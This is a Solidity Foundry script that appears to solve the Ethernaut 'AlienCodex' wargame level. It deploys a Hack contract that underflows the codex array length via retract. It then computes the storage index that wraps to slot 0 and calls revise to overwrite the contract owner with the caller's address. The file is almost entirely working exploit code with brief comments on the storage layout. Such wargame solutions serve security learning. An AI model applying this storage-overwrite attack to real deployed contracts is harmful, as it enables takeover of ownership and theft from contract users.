// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract AlienCodexSolution is Script {
    address target = 0xC5877ac5d61C7F7b7D5477292cBaDD921D135c53;

    function run() external {
        vm.startBroadcast();
        new Hack(IAlienCodex(target), vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}

interface IAlienCodex {
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Hack {
    constructor(IAlienCodex target, address me) {
        target.makeContact();
        target.retract();
        // slot 0 owner (20 byte) + bool (1 byte)
        // slot 1 codex.lenght (32 byte)
        /*
        slot h codex[0]
        slot h+1 codex[1]
        slot h+2 codex[2]
        .
        .
        .
        after calling retract
        uint h = 2**256-1
        uint i;
        h+i=0
        i=-h
         */

        uint256 h = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 i;
        unchecked {
            i -= h;
        }
        target.revise(i, bytes32(uint256(uint160(me))));
    }
}
